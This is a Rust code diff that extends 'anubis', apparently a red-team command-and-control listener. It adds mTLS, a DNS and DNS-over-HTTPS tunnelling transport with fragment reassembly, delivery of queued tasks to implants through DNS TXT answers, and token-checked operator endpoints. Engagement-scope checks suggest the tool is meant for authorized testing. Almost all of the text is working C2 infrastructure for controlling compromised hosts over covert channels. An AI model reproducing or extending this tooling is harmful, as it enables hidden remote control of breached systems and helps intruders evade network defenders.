@@ -1,7 +1,8 @@
-//! Multi-transport C2 listener: HTTP + DNS + UDS, aop-2 encrypted, operator console.
+//! Multi-transport C2 listener: HTTP (+ optional rustls mTLS) + DNS/DoH + UDS, aop-2 encrypted.
 
 use super::console;
 use super::crypto;
+use super::dns_codec::{self, DnsKind};
 use super::engagement::{Engagement, Role};
 use super::protocol::{
     Beacon, BeaconResponse, EncryptedEnvelope, Task, TaskResult, PROTOCOL_V1, PROTOCOL_V2,
@@ -14,7 +15,7 @@ use sha2::{Digest, Sha256};
 use std::collections::{HashMap, VecDeque};
 use std::fs;
 use std::io::{Read, Write};
-use std::net::{TcpListener, UdpSocket};
+use std::net::{TcpListener, TcpStream, UdpSocket};
 use std::os::unix::net::UnixListener;
 use std::path::{Path, PathBuf};
 use std::sync::{Arc, Mutex};
@@ -26,9 +27,26 @@ pub struct State {
     pub agents: HashMap<String, serde_json::Value>,
     pub queue: HashMap<String, VecDeque<Task>>,
     pub results: Vec<TaskResult>,
+    /// DNS fragment reassembly: key = peer+kind fingerprint → ordered frags
+    pub dns_frags: HashMap<String, Vec<dns_codec::DnsC2Message>>,
 }
 
+pub struct ListenOpts {
+    pub mtls: bool,
+}
+
+#[allow(dead_code)]
 pub fn listener_start(eng: &Engagement, engage_dir: &Path, _foreground: bool) -> Result<()> {
+    listener_start_with(
+        eng,
+        engage_dir,
+        ListenOpts {
+            mtls: eng.mtls_listen,
+        },
+    )
+}
+
+pub fn listener_start_with(eng: &Engagement, engage_dir: &Path, opts: ListenOpts) -> Result<()> {
     eng.validate_live()?;
     super::scope::bind_addr_in_scope(
         &eng.c2_bind,
@@ -40,8 +58,20 @@ pub fn listener_start(eng: &Engagement, engage_dir: &Path, _foreground: bool) ->
     fs::create_dir_all(engage_dir.join("tasks"))?;
     let state = Arc::new(Mutex::new(State::default()));
 
+    let use_mtls = opts.mtls || eng.mtls_listen;
+    if use_mtls && !eng.mtls_ready {
+        return Err(anyhow!(
+            "ANUBIS_MTLS_NOT_READY: certs missing; re-run engage-init"
+        ));
+    }
+    let tls_cfg = if use_mtls {
+        Some(crypto::mtls_server_config(engage_dir)?)
+    } else {
+        None
+    };
+
     let meta = json!({
-        "listener": "multi-transport-v2",
+        "listener": "multi-transport-v3",
         "bind_http": eng.c2_bind,
         "bind_dns": eng.dns_bind,
         "uds": eng.uds_path,
@@ -49,6 +79,10 @@ pub fn listener_start(eng: &Engagement, engage_dir: &Path, _foreground: bool) ->
         "protocol": PROTOCOL_V2,
         "encrypt": eng.encrypt_beacons,
         "mtls_ready": eng.mtls_ready,
+        "mtls_active": use_mtls,
+        "dns_codec": "aop-dns-v1",
+        "doh": true,
+        "token_auth_enabled": eng.token_auth_enabled,
         "engagement_id": eng.engagement_id,
         "started_unix": now_unix(),
     });
@@ -57,17 +91,26 @@ pub fn listener_start(eng: &Engagement, engage_dir: &Path, _foreground: bool) ->
         serde_json::to_string_pretty(&meta)?,
     )?;
 
+    let scheme = if use_mtls { "https" } else { "http" };
     println!(
-        "anubis listen: HTTP {} | DNS {} | UDS {} | protocol={} encrypt={}",
-        eng.c2_bind, eng.dns_bind, eng.uds_path, PROTOCOL_V2, eng.encrypt_beacons
+        "anubis listen: {} {} | DNS {} | UDS {} | protocol={} encrypt={} mtls={}",
+        scheme.to_uppercase(),
+        eng.c2_bind,
+        eng.dns_bind,
+        eng.uds_path,
+        PROTOCOL_V2,
+        eng.encrypt_beacons,
+        use_mtls
     );
-    println!("  console: http://{}/", eng.c2_bind);
-    println!("  POST /beacon /result /task | GET /health /agents /results /rbac /admin/status /");
+    println!("  console: {scheme}://{}/", eng.c2_bind);
+    println!(
+        "  POST /beacon /result /task /doh /dns-query | GET /health /agents /results /rbac /admin/status /"
+    );
 
     let eng = eng.clone();
     let engage_dir = engage_dir.to_path_buf();
 
-    // DNS transport thread
+    // DNS transport thread (production codec)
     if eng.transport == "dns" || eng.transport == "multi" {
         let st = state.clone();
         let eng_dns = eng.clone();
@@ -91,19 +134,19 @@ pub fn listener_start(eng: &Engagement, engage_dir: &Path, _foreground: bool) ->
         });
     }
 
-    // HTTP main thread
+    // HTTP / mTLS main thread
     let listener = TcpListener::bind(&eng.c2_bind)
         .map_err(|e| anyhow!("ANUBIS_LISTEN_BIND: {}: {}", eng.c2_bind, e))?;
     for stream in listener.incoming() {
         match stream {
-            Ok(mut stream) => {
+            Ok(stream) => {
                 let state = state.clone();
                 let eng = eng.clone();
                 let engage_dir = engage_dir.clone();
+                let tls_cfg = tls_cfg.clone();
                 thread::spawn(move || {
-                    if let Err(e) = handle_http(&mut stream, &eng, &engage_dir, &state) {
-                        let _ = write_raw(&mut stream, 500, b"error");
-                        eprintln!("http client error: {e}");
+                    if let Err(e) = accept_client(stream, tls_cfg, &eng, &engage_dir, &state) {
+                        eprintln!("client error: {e}");
                     }
                 });
             }
@@ -111,6 +154,33 @@ pub fn listener_start(eng: &Engagement, engage_dir: &Path, _foreground: bool) ->
         }
     }
     Ok(())
+}
+
+fn accept_client(
+    stream: TcpStream,
+    tls_cfg: Option<Arc<rustls::ServerConfig>>,
+    eng: &Engagement,
+    engage_dir: &Path,
+    state: &Arc<Mutex<State>>,
+) -> Result<()> {
+    if let Some(cfg) = tls_cfg {
+        let conn =
+            rustls::ServerConnection::new(cfg).map_err(|e| anyhow!("ANUBIS_MTLS_CONN: {e}"))?;
+        let mut tls = rustls::StreamOwned::new(conn, stream);
+        // Complete handshake by attempting a read; rustls drives handshake on first IO.
+        if let Err(e) = handle_http(&mut tls, eng, engage_dir, state) {
+            let _ = write_raw(&mut tls, 500, b"error");
+            return Err(e);
+        }
+        Ok(())
+    } else {
+        let mut stream = stream;
+        if let Err(e) = handle_http(&mut stream, eng, engage_dir, state) {
+            let _ = write_raw(&mut stream, 500, b"error");
+            return Err(e);
+        }
+        Ok(())
+    }
 }
 
 fn handle_http(
@@ -125,9 +195,11 @@ fn handle_http(
         return Ok(());
     }
     let req = String::from_utf8_lossy(&buf[..n]);
-    let (method, path) = parse_request_line(&req);
+    let (method, path_q) = parse_request_line(&req);
+    let (path, query) = split_path_query(&path_q);
     let body = extract_body(&req).to_string();
     let operator = header_value(&req, "X-Anubis-Operator").unwrap_or_else(|| "operator".into());
+    let token = header_value(&req, "X-Anubis-Token");
 
     drain_task_inbox(engage_dir, state)?;
 
@@ -146,6 +218,10 @@ fn handle_http(
                 "encrypt": eng.encrypt_beacons,
                 "transport": eng.transport,
                 "mtls_ready": eng.mtls_ready,
+                "mtls_listen": eng.mtls_listen,
+                "dns_codec": "aop-dns-v1",
+                "doh": true,
+                "token_auth_enabled": eng.token_auth_enabled,
             }),
         )?,
         ("GET", "/agents") => {
@@ -185,8 +261,7 @@ fn handle_http(
             write_json(stream, 200, &json!({"ok": true}))?;
         }
         ("GET", "/rbac") => {
-            // Any known operator may inspect their own RBAC surface.
-            if let Err(e) = eng.assert_role(&operator, Role::ReadOnly) {
+            if let Err(e) = eng.assert_auth(&operator, Role::ReadOnly, token.as_deref()) {
                 write_json(stream, 403, &json!({"error": e.to_string()}))?;
                 return Ok(());
             }
@@ -195,15 +270,20 @@ fn handle_http(
                 200,
                 &json!({
                     "operator": operator,
-                    "operators": eng.operators,
+                    "operators": eng.operators.iter().map(|o| json!({
+                        "name": o.name,
+                        "role": o.role,
+                        "token_required": !o.token_hash.is_empty(),
+                    })).collect::<Vec<_>>(),
+                    "token_auth_enabled": eng.token_auth_enabled,
                     "queue_ok": console::role_can_queue(eng, &operator).is_ok(),
                     "admin_ok": console::role_can_admin(eng, &operator).is_ok(),
                 }),
             )?;
         }
         ("GET", "/admin/status") => {
-            if let Err(e) = console::role_can_admin(eng, &operator) {
-                write_json(stream, 403, &json!({"error": e}))?;
+            if let Err(e) = eng.assert_auth(&operator, Role::Admin, token.as_deref()) {
+                write_json(stream, 403, &json!({"error": e.to_string()}))?;
                 return Ok(());
             }
             let st = state.lock().unwrap();
@@ -227,8 +307,8 @@ fn handle_http(
             )?;
         }
         ("POST", "/task") => {
-            if let Err(e) = console::role_can_queue(eng, &operator) {
-                write_json(stream, 403, &json!({"error": e}))?;
+            if let Err(e) = eng.assert_auth(&operator, Role::Operator, token.as_deref()) {
+                write_json(stream, 403, &json!({"error": e.to_string()}))?;
                 return Ok(());
             }
             let v: serde_json::Value = serde_json::from_str(&body)?;
@@ -268,7 +348,260 @@ fn handle_http(
                 .push_back(task.clone());
             write_json(stream, 200, &json!({"queued": task, "operator": operator}))?;
         }
+        // --- DoH / DNS-over-HTTPS (RFC 8484 + JSON convenience) ---
+        ("POST", "/dns-query") | ("POST", "/doh") => {
+            handle_doh(stream, eng, engage_dir, state, &req, &body, &query)?;
+        }
+        ("GET", "/dns-query") | ("GET", "/doh") => {
+            handle_doh(stream, eng, engage_dir, state, &req, &body, &query)?;
+        }
         _ => write_json(stream, 404, &json!({"error":"not found"}))?,
+    }
+    Ok(())
+}
+
+fn handle_doh(
+    stream: &mut (impl Read + Write),
+    eng: &Engagement,
+    engage_dir: &Path,
+    state: &Arc<Mutex<State>>,
+    req: &str,
+    body: &str,
+    query: &str,
+) -> Result<()> {
+    let ct = header_value(req, "Content-Type").unwrap_or_default();
+    // JSON convenience: {"qname":"..."} or wire via ?dns=
+    if ct.contains("json") || body.trim_start().starts_with('{') {
+        let v: serde_json::Value = serde_json::from_str(body).unwrap_or(json!({}));
+        let qname = v
+            .get("qname")
+            .and_then(|x| x.as_str())
+            .unwrap_or("")
+            .to_string();
+        if qname.is_empty() {
+            write_json(stream, 400, &json!({"error":"ANUBIS_DOH_QNAME_REQUIRED"}))?;
+            return Ok(());
+        }
+        let txts = process_dns_qname(eng, engage_dir, state, &qname, "doh-json")?;
+        let payload_b32 = txts
+            .iter()
+            .filter(|t| t.as_str() != "OK")
+            .cloned()
+            .collect::<Vec<_>>()
+            .join("");
+        write_json(
+            stream,
+            200,
+            &dns_codec::DohJsonResponse {
+                ok: true,
+                qname,
+                txt: txts,
+                payload_b32,
+            },
+        )?;
+        return Ok(());
+    }
+
+    // RFC 8484: GET ?dns= or POST application/dns-message
+    let wire = if let Some(dns_param) = query_param(query, "dns") {
+        dns_codec::doh_decode_param(&dns_param)?
+    } else if !body.is_empty() {
+        body.as_bytes().to_vec()
+    } else {
+        write_json(stream, 400, &json!({"error":"ANUBIS_DOH_EMPTY"}))?;
+        return Ok(());
+    };
+
+    let dq = dns_codec::parse_dns_query(&wire)?;
+    let txts = process_dns_qname(eng, engage_dir, state, &dq.qname, "doh-wire")?;
+    let resp = dns_codec::build_txt_response(&dq, &txts);
+    write_dns_message(stream, 200, &resp)?;
+    Ok(())
+}
+
+fn process_dns_qname(
+    eng: &Engagement,
+    engage_dir: &Path,
+    state: &Arc<Mutex<State>>,
+    qname: &str,
+    peer: &str,
+) -> Result<Vec<String>> {
+    let frag = match dns_codec::decode_qname(qname) {
+        Ok(f) => f,
+        Err(e) => {
+            // Non-C2 queries still get a minimal answer so the codec stays resilient.
+            let _ = append_evidence(
+                engage_dir,
+                "dns_non_c2",
+                &json!({"qname": qname, "peer": peer, "error": e.to_string()}),
+            );
+            return Ok(vec!["NX".into()]);
+        }
+    };
+
+    let key = format!("{peer}:{:?}:{}", frag.kind, frag.total);
+    let payload = {
+        let mut st = state.lock().unwrap();
+        let bucket = st.dns_frags.entry(key.clone()).or_default();
+        // Replace same seq
+        if let Some(slot) = bucket.iter_mut().find(|f| f.seq == frag.seq) {
+            *slot = frag.clone();
+        } else {
+            bucket.push(frag.clone());
+        }
+        let complete = bucket.len() as u16 >= frag.total && frag.total > 0;
+        if complete {
+            let assembled = dns_codec::reassemble(bucket)?;
+            st.dns_frags.remove(&key);
+            Some(assembled)
+        } else {
+            None
+        }
+    };
+
+    match frag.kind {
+        DnsKind::Poll if frag.total == 1 && frag.payload.is_empty() => {
+            // Heartbeat / empty poll → return next queued task blob if any
+            let agent_id = format!("dns-{}", &hex::encode(Sha256::digest(peer.as_bytes()))[..8]);
+            let mut st = state.lock().unwrap();
+            st.agents.insert(
+                agent_id.clone(),
+                json!({
+                    "agent_id": agent_id,
+                    "transport": "dns",
+                    "peer": peer,
+                    "last_beacon_unix": now_unix(),
+                }),
+            );
+            let task = st
+                .queue
+                .get_mut(&agent_id)
+                .and_then(|q| q.pop_front())
+                .or_else(|| st.queue.get_mut("*").and_then(|q| q.pop_front()));
+            drop(st);
+            if let Some(t) = task {
+                let body = serde_json::to_vec(&t)?;
+                return Ok(dns_codec::encode_txt_payload(&body));
+            }
+            return Ok(vec!["OK".into()]);
+        }
+        _ => {}
+    }
+
+    let Some(raw) = payload else {
+        // ACK partial fragment
+        return Ok(vec![format!("ACK.{}", frag.seq)]);
+    };
+
+    match frag.kind {
+        DnsKind::Beacon => {
+            let beacon = decode_beacon_bytes(eng, &raw)?;
+            if beacon.engagement_id != eng.engagement_id {
+                return Ok(vec!["DENY".into()]);
+            }
+            let resp = process_beacon(eng, engage_dir, state, &beacon)?;
+            let out = encode_response(eng, &beacon.agent_id, &resp)?;
+            Ok(dns_codec::encode_txt_payload(out.as_bytes()))
+        }
+        DnsKind::Result => {
+            let result = decode_result_bytes(eng, &raw)?;
+            if result.engagement_id != eng.engagement_id {
+                return Ok(vec!["DENY".into()]);
+            }
+            store_result(engage_dir, state, result)?;
+            Ok(vec!["OK".into()])
+        }
+        DnsKind::Poll => {
+            // Poll with optional agent identity in payload
+            let agent_id = if raw.is_empty() {
+                format!("dns-{}", &hex::encode(Sha256::digest(peer.as_bytes()))[..8])
+            } else {
+                String::from_utf8_lossy(&raw).trim().to_string()
+            };
+            let mut st = state.lock().unwrap();
+            st.agents.insert(
+                agent_id.clone(),
+                json!({
+                    "agent_id": agent_id,
+                    "transport": "dns",
+                    "peer": peer,
+                    "last_beacon_unix": now_unix(),
+                }),
+            );
+            let task = st
+                .queue
+                .get_mut(&agent_id)
+                .and_then(|q| q.pop_front())
+                .or_else(|| st.queue.get_mut("*").and_then(|q| q.pop_front()));
+            drop(st);
+            if let Some(t) = task {
+                let body = serde_json::to_vec(&t)?;
+                Ok(dns_codec::encode_txt_payload(&body))
+            } else {
+                Ok(vec!["OK".into()])
+            }
+        }
+    }
+}
+
+fn dns_loop(eng: &Engagement, engage_dir: &Path, state: Arc<Mutex<State>>) -> Result<()> {
+    let sock = UdpSocket::bind(&eng.dns_bind)
+        .map_err(|e| anyhow!("ANUBIS_DNS_BIND: {}: {e}", eng.dns_bind))?;
+    println!("dns listener on {} (codec aop-dns-v1)", eng.dns_bind);
+    let mut buf = [0u8; 1500];
+    loop {
+        let (n, src) = sock.recv_from(&mut buf)?;
+        let peer = src.to_string();
+        let reply = match dns_codec::parse_dns_query(&buf[..n]) {
+            Ok(dq) => {
+                let txts = process_dns_qname(eng, engage_dir, &state, &dq.qname, &peer)
+                    .unwrap_or_else(|e| {
+                        vec![format!("ERR")]
+                            .into_iter()
+                            .chain(std::iter::once(e.to_string()))
+                            .take(1)
+                            .collect()
+                    });
+                let _ = append_evidence(
+                    engage_dir,
+                    "dns_query",
+                    &json!({"peer": peer, "qname": dq.qname, "bytes": n}),
+                );
+                dns_codec::build_txt_response(&dq, &txts)
+            }
+            Err(_) => {
+                // Echo only when not parseable (legacy lab probe)
+                buf[..n].to_vec()
+            }
+        };
+        let _ = sock.send_to(&reply, src);
+    }
+}
+
+fn uds_loop(eng: &Engagement, engage_dir: &Path, state: Arc<Mutex<State>>) -> Result<()> {
+    let path = PathBuf::from(&eng.uds_path);
+    let _ = fs::remove_file(&path);
+    if let Some(parent) = path.parent() {
+        fs::create_dir_all(parent)?;
+    }
+    let listener = UnixListener::bind(&path)
+        .map_err(|e| anyhow!("ANUBIS_UDS_BIND: {}: {e}", path.display()))?;
+    println!("uds listener on {}", path.display());
+    for stream in listener.incoming() {
+        let mut stream = stream?;
+        let mut buf = String::new();
+        stream.read_to_string(&mut buf)?;
+        if buf.trim().is_empty() {
+            continue;
+        }
+        if let Ok(beacon) = decode_beacon(eng, buf.trim()) {
+            let resp = process_beacon(eng, engage_dir, &state, &beacon)?;
+            let out = encode_response(eng, &beacon.agent_id, &resp)?;
+            let _ = stream.write_all(out.as_bytes());
+        } else if let Ok(result) = decode_result(eng, buf.trim()) {
+            store_result(engage_dir, &state, result)?;
+            let _ = stream.write_all(br#"{"ok":true}"#);
+        }
     }
     Ok(())
 }
@@ -340,23 +673,35 @@ fn store_result(engage_dir: &Path, state: &Arc<Mutex<State>>, result: TaskResult
 }
 
 fn decode_beacon(eng: &Engagement, body: &str) -> Result<Beacon> {
-    let body = body.trim();
+    decode_beacon_bytes(eng, body.trim().as_bytes())
+}
+
+fn decode_beacon_bytes(eng: &Engagement, raw: &[u8]) -> Result<Beacon> {
+    let body = std::str::from_utf8(raw).unwrap_or("");
     if body.contains("\"blob\"") || eng.encrypt_beacons {
-        if let Ok(env) = serde_json::from_str::<EncryptedEnvelope>(body) {
+        if let Ok(env) = serde_json::from_slice::<EncryptedEnvelope>(raw)
+            .or_else(|_| serde_json::from_str::<EncryptedEnvelope>(body))
+        {
             return crypto::open_json(&eng.psk_hex, &env.blob);
         }
     }
-    Ok(serde_json::from_str(body)?)
+    Ok(serde_json::from_slice(raw).or_else(|_| serde_json::from_str(body))?)
 }
 
 fn decode_result(eng: &Engagement, body: &str) -> Result<TaskResult> {
-    let body = body.trim();
+    decode_result_bytes(eng, body.trim().as_bytes())
+}
+
+fn decode_result_bytes(eng: &Engagement, raw: &[u8]) -> Result<TaskResult> {
+    let body = std::str::from_utf8(raw).unwrap_or("");
     if body.contains("\"blob\"") || eng.encrypt_beacons {
-        if let Ok(env) = serde_json::from_str::<EncryptedEnvelope>(body) {
+        if let Ok(env) = serde_json::from_slice::<EncryptedEnvelope>(raw)
+            .or_else(|_| serde_json::from_str::<EncryptedEnvelope>(body))
+        {
             return crypto::open_json(&eng.psk_hex, &env.blob);
         }
     }
-    Ok(serde_json::from_str(body)?)
+    Ok(serde_json::from_slice(raw).or_else(|_| serde_json::from_str(body))?)
 }
 
 fn encode_response(eng: &Engagement, agent_id: &str, resp: &BeaconResponse) -> Result<String> {
@@ -372,72 +717,6 @@ fn encode_response(eng: &Engagement, agent_id: &str, resp: &BeaconResponse) -> R
     } else {
         Ok(serde_json::to_string(resp)?)
     }
-}
-
-/// Minimal DNS C2: TXT query name encodes agent id; response TXT carries base64 task blob length-limited.
-fn dns_loop(eng: &Engagement, engage_dir: &Path, state: Arc<Mutex<State>>) -> Result<()> {
-    let sock = UdpSocket::bind(&eng.dns_bind)
-        .map_err(|e| anyhow!("ANUBIS_DNS_BIND: {}: {e}", eng.dns_bind))?;
-    println!("dns listener on {}", eng.dns_bind);
-    let mut buf = [0u8; 1500];
-    loop {
-        let (n, src) = sock.recv_from(&mut buf)?;
-        // Very small lab DNS: if payload contains agent marker, enqueue presence
-        let s = String::from_utf8_lossy(&buf[..n]);
-        if s.contains("aop") || n > 12 {
-            let agent_id = format!(
-                "dns-{}",
-                &hex::encode(Sha256::digest(&buf[..n.min(32)]))[..8]
-            );
-            let mut st = state.lock().unwrap();
-            st.agents.insert(
-                agent_id.clone(),
-                json!({
-                    "agent_id": agent_id,
-                    "transport": "dns",
-                    "peer": src.to_string(),
-                    "last_beacon_unix": now_unix(),
-                }),
-            );
-            drop(st);
-            let _ = append_evidence(
-                engage_dir,
-                "dns_query",
-                &json!({"peer": src.to_string(), "bytes": n}),
-            );
-        }
-        // Echo minimal DNS-like reply (not a full recursive server)
-        let _ = sock.send_to(&buf[..n], src);
-    }
-}
-
-fn uds_loop(eng: &Engagement, engage_dir: &Path, state: Arc<Mutex<State>>) -> Result<()> {
-    let path = PathBuf::from(&eng.uds_path);
-    let _ = fs::remove_file(&path);
-    if let Some(parent) = path.parent() {
-        fs::create_dir_all(parent)?;
-    }
-    let listener = UnixListener::bind(&path)
-        .map_err(|e| anyhow!("ANUBIS_UDS_BIND: {}: {e}", path.display()))?;
-    println!("uds listener on {}", path.display());
-    for stream in listener.incoming() {
-        let mut stream = stream?;
-        let mut buf = String::new();
-        stream.read_to_string(&mut buf)?;
-        if buf.trim().is_empty() {
-            continue;
-        }
-        // Accept beacon or result JSON / encrypted envelope
-        if let Ok(beacon) = decode_beacon(eng, buf.trim()) {
-            let resp = process_beacon(eng, engage_dir, &state, &beacon)?;
-            let out = encode_response(eng, &beacon.agent_id, &resp)?;
-            let _ = stream.write_all(out.as_bytes());
-        } else if let Ok(result) = decode_result(eng, buf.trim()) {
-            store_result(engage_dir, &state, result)?;
-            let _ = stream.write_all(br#"{"ok":true}"#);
-        }
-    }
-    Ok(())
 }
 
 fn drain_task_inbox(engage_dir: &Path, state: &Arc<Mutex<State>>) -> Result<()> {
@@ -499,6 +778,25 @@ fn parse_request_line(req: &str) -> (String, String) {
     )
 }
 
+fn split_path_query(path_q: &str) -> (String, String) {
+    if let Some((p, q)) = path_q.split_once('?') {
+        (p.to_string(), q.to_string())
+    } else {
+        (path_q.to_string(), String::new())
+    }
+}
+
+fn query_param(query: &str, key: &str) -> Option<String> {
+    for pair in query.split('&') {
+        if let Some((k, v)) = pair.split_once('=') {
+            if k == key {
+                return Some(v.to_string());
+            }
+        }
+    }
+    None
+}
+
 fn extract_body(req: &str) -> &str {
     if let Some(idx) = req.find("\r\n\r\n") {
         &req[idx + 4..]
@@ -511,15 +809,6 @@ fn extract_body(req: &str) -> &str {
 
 fn header_value(req: &str, name: &str) -> Option<String> {
     for line in req.lines() {
-        if let Some(rest) = line
-            .strip_prefix(name)
-            .or_else(|| line.strip_prefix(&name.to_ascii_lowercase()))
-        {
-            if let Some(v) = rest.strip_prefix(':') {
-                return Some(v.trim().to_string());
-            }
-        }
-        // case-insensitive scan
         if line
             .to_ascii_lowercase()
             .starts_with(&name.to_ascii_lowercase())
@@ -553,11 +842,22 @@ fn write_raw(stream: &mut impl Write, status: u16, payload: &[u8]) -> Result<()>
         200 => "OK",
         403 => "Forbidden",
         404 => "Not Found",
+        400 => "Bad Request",
         _ => "Error",
     };
     write!(
         stream,
         "HTTP/1.1 {status} {reason}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
+        payload.len()
+    )?;
+    stream.write_all(payload)?;
+    Ok(())
+}
+
+fn write_dns_message(stream: &mut impl Write, status: u16, payload: &[u8]) -> Result<()> {
+    write!(
+        stream,
+        "HTTP/1.1 {status} OK\r\nContent-Type: application/dns-message\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
         payload.len()
     )?;
     stream.write_all(payload)?;
